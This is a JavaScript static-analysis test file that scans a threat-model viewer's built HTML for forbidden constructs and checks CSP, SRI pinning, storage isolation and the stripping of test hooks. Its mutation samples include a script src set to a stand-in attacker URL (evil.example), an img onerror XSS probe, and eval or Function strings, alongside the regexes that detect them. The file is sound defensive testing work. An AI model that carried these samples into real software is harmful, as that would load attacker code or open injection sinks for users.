/*
 * static.test.mjs — the static analysis of `09-testing.md` §5, over the built artifact.
 *
 * §5 ends with a sentence that decides the whole design of this file: the analysis is "over the
 * **built artifact**, not the sources — the artifact is what ships". Every check below therefore
 * reads `dist/threat-model-viewport.html`, including the ones whose requirement is phrased about
 * modules (`REQ-STORE-001` says "no *feature module* references `localStorage`", and the answer is
 * found by locating the reference's position inside the artifact's own module markers).
 *
 * A static check is a search, and a search over this artifact is wrong in a specific way unless it is
 * written carefully. The shipped script is 1.4 MB of application code that talks *about* the
 * constructs it forbids: `01-core.js` explains why it has no HTML-injection sink, `07-storage.js`
 * names `localStorage` in four comments and touches it in one line, `14-diagrams.js` has a Mermaid
 * shape function with an `amplitude` parameter. A plain substring scan reports the documentation as
 * the violation, and the correction a hurried reader applies is to weaken the scan — which is how a
 * check that would have caught a real defect becomes one that passes forever. So every code scan here
 * goes through `codeOnly`/`stripComments` (`test/lib/scan.mjs`), which blank comments and literals
 * while preserving offsets, so a finding can still be reported at its real line.
 *
 * **Every check is paired with a mutation it must flag.** A scan that cannot fail is not a test, and
 * the failure is silent: an artifact scan that is subtly wrong passes on a correct artifact exactly
 * like one that is right. So each `specTest` below asserts both directions — zero findings on the
 * artifact, and a finding on a string built to violate the rule. The mutation is written inline next
 * to the rule it exercises, so a rule and its counterexample cannot drift apart.
 *
 * The literal tag sequences are built from parts (`'<' + 'script'`) rather than written out. None of
 * these test files ship, but a file that greps for a string should not itself contain it, and
 * `build.mjs` fails the build outright on a literal script tag anywhere in the concatenated sources.
 */

import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';

import { specTest } from './lib/check.mjs';
import { ROOT, LOADED_FILES, SOURCE } from './lib/app.mjs';
import {
  appScript,
  codeOnly,
  externalRefs,
  findings,
  markupOnly,
  openTags,
  parseAttrs,
  refs,
  isAbsoluteRef,
  scriptBodies,
  stripComments,
  stripTestHooks,
  TEST_HOOK_SENTINELS,
} from './lib/scan.mjs';

const ARTIFACT = `${ROOT}/dist/threat-model-viewport.html`;
const html = readFileSync(ARTIFACT, 'utf8');

/** The one executable script: what the document actually runs. */
const app = appScript(html);

/** The artifact's script, as identifiers and operators — comments and literals blanked. */
const code = codeOnly(app);

/** The artifact's script with literals intact, for rules whose subject *is* a literal. */
const text = stripComments(app);

/** The markup only: comments, script bodies and style bodies blanked, tags kept. */
const markup = markupOnly(html);

/**
 * Fail with the offending line, not just a count.
 *
 * A static check that reports "3 findings" makes the reader go and find them; one that reports the
 * line and the surrounding text is a fix.
 */
function assertNoMatches(label, subject, pattern) {
  const hits = findings(subject, pattern);
  assert.equal(
    hits.length,
    0,
    `${label}: ${hits.length} occurrence(s) in the artifact — first at line ${hits[0] && hits[0].line} near ${hits[0] && JSON.stringify(hits[0].context)}`,
  );
}

/** The other half of a static check: the same rule, on a string that breaks it. */
function assertFlags(label, subject, pattern) {
  assert.ok(
    findings(subject, pattern).length > 0,
    `${label}: the check did not flag a deliberate violation — ${JSON.stringify(subject.slice(0, 80))}`,
  );
}

// ---------------------------------------------------------------------------------------------
// The rules, each with the counterexample it has to catch
// ---------------------------------------------------------------------------------------------

/**
 * REQ-SEC-002 — no dynamic code execution.
 *
 * The counterexamples are split only where the token is a tag; the rest are written plainly, because
 * the point of this test is to be readable next to the rule it guards.
 */
const DYNAMIC_EXECUTION = [
  { label: 'eval(…)', pattern: /\beval\s*\(/g, on: code, sample: 'var r = eval("1 + 1");' },
  { label: 'new Function(…)', pattern: /\bnew\s+Function\b/g, on: code, sample: 'var f = new Function("return 1");' },
  { label: 'Function(…) as a constructor', pattern: /(^|[^.\w$])Function\s*\(/g, on: code, sample: 'var f = Function("return 1");' },
  {
    label: 'setTimeout/setInterval with a string',
    pattern: /(setTimeout|setInterval)\s*\(\s*['"`]/g,
    // The literal is the subject, so this one runs with literals intact: `codeOnly` would blank the
    // string and the rule would never match the very thing it is looking for.
    on: text,
    sample: 'setTimeout("go()", 10);',
  },
  {
    label: 'dynamic script insertion',
    pattern: /createElement\s*\(\s*['"]script/g,
    on: text,
    sample: 'var s = document.createElement("script");',
  },
  { label: 'document.write', pattern: /document\s*\.\s*write\b/g, on: code, sample: 'document.write("<b>hi</b>");' },
  { label: 'a script element src assigned from a string', pattern: /\.\s*src\s*=\s*['"]/g, on: text, sample: 's.src = "https://evil.example/x.js";' },
];

specTest('sec.no-dynamic-exec', () => {
  for (const rule of DYNAMIC_EXECUTION) {
    assertNoMatches(rule.label, rule.on, rule.pattern);
    assertFlags(rule.label, rule.on === code ? codeOnly(rule.sample) : stripComments(rule.sample), rule.pattern);
  }

  // The scan has to tell code from prose, or it reports the documentation. These are the two cases
  // the artifact actually contains: `01-core.js` explains the absence of an HTML sink, and
  // `07-storage.js` names `localStorage` above the one line that uses it.
  assert.equal(findings(codeOnly('// uses eval( here\n/* and innerHTML */'), /\beval\s*\(|innerHTML/g).length, 0, 'prose must not read as code');
  assert.equal(findings(codeOnly('n.innerHTML = eval("1")'), /\beval\s*\(|innerHTML/g).length, 2, 'real code must read as code');

  // A regex literal containing a quote desynchronised an earlier version of the scanner, which then
  // reported three `localStorage` occurrences in comments as code. Both files that contain one are
  // named here so the regression cannot come back unnoticed.
  assert.equal(
    findings(codeOnly("var p = /[\\s\"']/g;\nif (p.test(s)) x.innerHTML = 1;"), /innerHTML/g).length,
    1,
    'a regex literal containing a quote must not desynchronise the scan',
  );
  assert.equal(findings(codeOnly('var q = a / b / c;\nq.innerHTML = 1;'), /innerHTML/g).length, 1, 'division is not a regex');
});

/**
 * REQ-SEC-003's static half — no path may build markup from a string.
 *
 * The behavioural half (a hostile model field rendered as text) is `sec.xss-model-fields` in
 * `test/unit/sec.test.mjs`; §5 pairs this row with the same requirement, so the two belong to one
 * named test and the sink scan lives beside the rendering assertion. This file keeps only the rules
 * §5 assigns to it, and `innerHTML` is listed here as the counterexample for `sec.no-dynamic-exec`'s
 * neighbour: `document.write` above, `innerHTML` here, are the same class of defect.
 */
specTest('sec.no-inline-handlers', () => {
  // An inline handler is an attribute *position*, not a substring: `data-x="onload=1"` contains the
  // text and is not a handler, and `onload` inside a script body is an identifier. Both are checked
  // below, because the naive regex flags the first and the artifact contains several of the second.
  const handlersOf = (document) =>
    openTags(document).flatMap((tag) => tag.attrs.filter((a) => /^on/i.test(a.name)).map((a) => `${tag.name}[${a.name}]`));

  assert.deepEqual(handlersOf(html), [], 'the artifact has no inline event handler attributes');

  assert.deepEqual(handlersOf(`<div ${'onclick'}="x()"></div>`), ['div[onclick]']);
  assert.deepEqual(handlersOf('<img src="x" onerror="alert(1)">'), ['img[onerror]'], 'an error handler on an image is a handler');
  assert.deepEqual(handlersOf('<div data-x="onload=1"></div>'), [], 'text inside an attribute value is not an attribute');
  assert.deepEqual(handlersOf('<div title="onerror=1"></div>'), [], 'text inside an attribute value is not an attribute');
  assert.deepEqual(handlersOf(`<${'script'}>var onload = 1;</${'script'}>`), [], 'an identifier in a script body is not a handler');
  assert.deepEqual(handlersOf('<!-- <p onload="x"> -->'), [], 'a handler inside a comment is not in the document');
});

/**
 * REQ-SHELL-002 — one classic inline script, and §5's CSP row (REQ-SEC-001) with it.
 *
 * `classic` is the load-bearing word, twice over: `type="module"` is refused because `file://` gives
 * a module script an opaque origin where `src` fails, and the CSP hash only protects the script if
 * the policy is already in force when the parser reaches it. So this test asserts the artifact's
 * script *structure* — exactly one executable script, no module scripts, no relative `src` — and that
 * the hash the CSP declares is the hash of that script's actual bytes, since a hash that describes a
 * different script protects nothing while looking exactly like one that does.
 */
specTest('shell.classic-script', () => {
  const scripts = scriptBodies(html);
  const executable = scripts.filter((s) => !parseAttrs(s.attrs).some((a) => a.name === 'src' || a.value === 'application/json'));

  assert.equal(executable.length, 1, 'the artifact has exactly one inline executable script');
  assert.equal(scripts.filter((s) => parseAttrs(s.attrs).some((a) => a.name === 'type' && a.value === 'module')).length, 0, 'no module script');

  // The extraction the whole file rests on: a body containing a closing tag would end the element
  // early and make every scan below read less than the file it claims to have read.
  for (const s of scripts) {
    assert.equal(/<\/script/i.test(s.body), false, 'no script body contains a tag sequence');
  }

  // No `<script type="module" src="…">` with a relative URL — the form REQ-SHELL-002 names.
  const moduleish = openTags(`<${'script'} type="module" src="./app.js"></${'script'}>`).filter(
    (t) => t.name === 'script' && t.attrs.some((a) => a.name === 'type' && a.value === 'module'),
  );
  assert.equal(moduleish.length, 1, 'the check must flag a module script');

  // The CSP precedes the first script, and pins this script's bytes. The hash is computed here from
  // the script the document carries, rather than trusted from the meta tag that declares it.
  const cspAt = html.search(/<meta[^>]+http-equiv\s*=\s*["']?content-security-policy/i);
  const firstScriptAt = html.search(/<script\b/i);
  assert.ok(cspAt !== -1, 'the artifact carries a Content-Security-Policy meta tag');
  assert.ok(cspAt < firstScriptAt, 'the CSP meta precedes the first script element');

  const policy = /<meta[^>]+http-equiv\s*=\s*["']?content-security-policy["']?[^>]*content="([^"]*)"/i.exec(html)[1];
  const declaredHash = /script-src\s+'([^']+)'/.exec(policy)[1];
  const actualHash = `sha256-${createHash('sha256').update(executable[0].body).digest('base64')}`;
  assert.equal(declaredHash, actualHash, 'the CSP script-src hash is the hash of the script the artifact carries');
  assert.equal(actualHash, /<meta name="tmv-app-hash" content="([^"]+)"/.exec(html)[1], 'the app-hash meta names the same bytes');
  assert.match(policy, /default-src 'none'/, 'the policy denies by default');
  assert.match(policy, /connect-src 'none'/, 'the policy permits no connection of any kind');
});

/**
 * REQ-SHELL-001 — one distributable file, with no relative reference to a sibling.
 *
 * This is the check that the artifact is *the* artifact: a `src` or `href` pointing at a file next to
 * it would mean the deliverable is a directory, and the failure only shows up on a machine where the
 * sibling is missing.
 */
specTest('shell.no-relative-refs', () => {
  const relative = refs(html).filter((r) => r.value !== '' && !isAbsoluteRef(r.value));
  assert.deepEqual(relative, [], 'every src/href in the artifact is absolute or a fragment');

  const sibling = (document) => refs(document).filter((r) => r.value !== '' && !isAbsoluteRef(r.value));
  assert.equal(sibling('<link rel="stylesheet" href="styles.css">').length, 1, 'a sibling stylesheet is a relative reference');
  assert.equal(sibling('<img src="./img/x.png">').length, 1, 'a dot-relative path is a relative reference');
  assert.equal(sibling('<a href="#tmv-content">skip</a>').length, 0, 'a fragment is in-document, not a relative file');
  assert.equal(sibling('<img src="data:image/png;base64,AAAA">').length, 0, 'a data URI carries no file reference');

  // The artifact does reference its own content by fragment, and that is the only relative form.
  assert.ok(refs(html).some((r) => r.value.startsWith('#')), 'the skip link is still a fragment reference');
});

/**
 * REQ-UI-012 — every external URL is exactly versioned and integrity-checked.
 *
 * An unpinned CDN URL is a supply-chain hole with a version number that changes under it, and an
 * `integrity` attribute is what makes the pin checkable by the browser rather than by trust. Both
 * requirements are on the same element, so they are asserted together, and `crossorigin` is asserted
 * too: without it the browser will not perform the SRI check on a cross-origin response at all, which
 * makes the digest decorative.
 */
specTest('sec.sri-pinned', () => {
  const external = externalRefs(html);
  assert.ok(external.length > 0, 'the artifact does make the permitted external references');

  for (const reference of external) {
    const tag = openTags(html).find((t) => t.attrs.some((a) => a.value === reference.value));
    const named = `the <${tag.name}> for ${reference.value}`;
    assert.match(reference.value, /@\d+\.\d+\.\d+(\/|$)/, `${named} is pinned to an exact version`);
    const integrity = tag.attrs.find((a) => a.name === 'integrity');
    assert.ok(integrity, `${named} carries an integrity attribute`);
    assert.match(integrity.value, /^sha(256|384|512)-[A-Za-z0-9+/]+=*$/, `${named} carries a real SRI digest`);
    assert.equal((tag.attrs.find((a) => a.name === 'crossorigin') || {}).value, 'anonymous', `${named} is fetched with crossorigin="anonymous"`);
  }

  // The pin is recorded in `vendor/`, and the artifact must carry what is recorded there: a digest
  // edited into a module instead would be a second source of truth for the same fact.
  const pinned = readFileSync(`${ROOT}/vendor/mermaid.version`, 'utf8').trim();
  const digest = readFileSync(`${ROOT}/vendor/mermaid.sri`, 'utf8').trim();
  assert.match(pinned, /^\d+\.\d+\.\d+$/, 'vendor/mermaid.version is an exact version');
  const mermaid = openTags(html).find((t) => t.name === 'script' && t.attrs.some((a) => a.name === 'src'));
  assert.ok(mermaid.attrs.find((a) => a.name === 'src').value.includes(`@${pinned}/`), 'the mermaid URL carries the vendored version');
  assert.equal(mermaid.attrs.find((a) => a.name === 'integrity').value, digest, 'the mermaid integrity attribute is the vendored digest');

  // And the check must fail on each half independently.
  assert.equal(/@\d+\.\d+\.\d+/.test('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js'), false, 'an unversioned URL has no exact version');
  assert.equal(openTags(`<${'script'} src="https://cdn.jsdelivr.net/npm/mermaid@12.0.0/dist/mermaid.min.js"></${'script'}>`)[0].attrs.some((a) => a.name === 'integrity'), false, 'a script without integrity is not pinned');
  assert.notEqual((openTags(`<${'script'} integrity="sha384-x" crossorigin="use-credentials"></${'script'}>`)[0].attrs.find((a) => a.name === 'crossorigin') || {}).value, 'anonymous');
});

/**
 * REQ-STORE-001 — no feature module touches storage except through the adapter.
 *
 * The requirement is about modules, and the artifact is where the modules are after concatenation:
 * `build.mjs` marks each one, so "which module does this reference belong to" is answerable over the
 * shipped file rather than over the sources. That matters because the thing being prevented is a
 * *view* reaching past the adapter, and a check that only reads `src/app/07-storage.js` would pass on
 * a build whose concatenation dropped a module or read the wrong directory.
 */
specTest('store.no-direct-storage-access', () => {
  const references = findings(code, /localStorage/g);
  assert.equal(references.length, 1, `the artifact names localStorage in code exactly once (found ${references.length})`);

  // Which module that one reference is in. The markers are read from the artifact's own script, and
  // the module's first occurrence is the one the build emitted.
  const markers = [...app.matchAll(/\/\* ---- (src\/app\/[^\s]+) ---- \*\//g)].map((m) => ({ file: m[1], at: m.index }));
  const owning = markers.filter((m) => m.at <= references[0].index).pop();
  assert.ok(owning, 'the reference falls inside a marked module region');
  assert.equal(owning.file, 'src/app/07-storage.js', 'the one reference is in the storage adapter');

  // The attribution only means something if the artifact really contains every module. Otherwise a
  // scan of a truncated script would report "one reference, in the adapter" and be wrong.
  const stripped = (file) => codeOnly(stripTestHooks(SOURCE.get(file)));
  const absent = LOADED_FILES.filter((file) => !code.includes(stripped(file)));
  assert.deepEqual(absent, [], 'every module in BUILD_ORDER is present in the artifact script');

  // And a view that read the store directly would be caught, and attributed to the view rather than
  // to the adapter — which is the whole content of REQ-STORE-001.
  const view = '/* ---- src/app/18-views-overview.js ---- */\nvar v = globalThis.localStorage.getItem("tmv");';
  const viewReference = codeOnly(view).indexOf('localStorage');
  assert.ok(viewReference !== -1, 'a direct read in a view is visible to the scan');
  const viewMarker = [...view.matchAll(/\/\* ---- (src\/app\/[^\s]+) ---- \*\//g)].pop();
  assert.ok(viewMarker.index < viewReference, 'the marker precedes the reference, so the region is unambiguous');
  assert.equal(viewMarker[1], 'src/app/18-views-overview.js', 'a direct read is attributed to the view that made it');
});

/**
 * `09-testing.md` §5, fault injection — the seam is compiled out of the release build.
 *
 * This test carries the suite's single traceability exemption (`EXEMPT` in `test/lib/spec.mjs`),
 * because it is a claim about the release artifact rather than a behaviour anyone asked for: the
 * storage adapter must be able to fail a write on command for `store.interrupted-commit` to exist at
 * all, and the same hook must not be reachable in `dist/`.
 *
 * The second half is what stops this being a test that passes for the wrong reason. Asserting only
 * that `dist/` lacks the seam would pass just as well on a build that never had one — on the day the
 * marked regions are deleted from the sources, the check would still be green while the fault-
 * injection tests it exists for were gone. So the seam is required to *be* in the sources, and the
 * artifact is required to be those sources with the marked regions cut.
 */
specTest('store.no-test-hooks-in-release', () => {
  const { begin, end } = TEST_HOOK_SENTINELS;

  assert.equal(html.includes(begin) || html.includes(end), false, 'no sentinel survives into the artifact');
  assertNoMatches('the fault-injection handle', app, /\b__test\b/g);
  assertNoMatches('the fault-injection counter', code, /testFailWritesAt|testHookWrites/g);
  assertNoMatches('the call site', code, /testHookBeforeWrite/g);
  assertNoMatches('the counter on the released namespace', app, /failWritesAt|writesSeen/g);

  // The seam has to exist, or the assertions above assert nothing.
  const sources = LOADED_FILES.map((f) => SOURCE.get(f)).join('\n');
  assert.ok(sources.includes(begin) && sources.includes(end), 'the sources do carry the marked region');
  assert.ok(sources.includes('TMV.storage.__test'), 'the sources do expose the fault-injection handle');

  // The artifact is the sources with the marked region removed — not an older build, and not a
  // module that was edited to hide the seam.
  const storage = stripTestHooks(SOURCE.get('07-storage.js'));
  assert.notEqual(storage, SOURCE.get('07-storage.js'), 'stripping does change the storage module');
  assert.ok(code.includes(codeOnly(storage)), 'the artifact carries the stripped storage module');

  // Falsify: an unstripped build is exactly the failure this test is for.
  const unstripped = `var x = 1;\n${begin}\nTMV.storage.__test = { failWritesAt: 1 };\n${end}\n`;
  assert.ok(/TMV\.storage\.__test|\b__test\b/.test(unstripped), 'the handle is detected when present');
  assert.ok(/testFailWritesAt|failWritesAt/.test(unstripped), 'the counter is detected when present');
  assert.equal(stripTestHooks(unstripped).includes('__test'), false, 'stripping removes it');
});
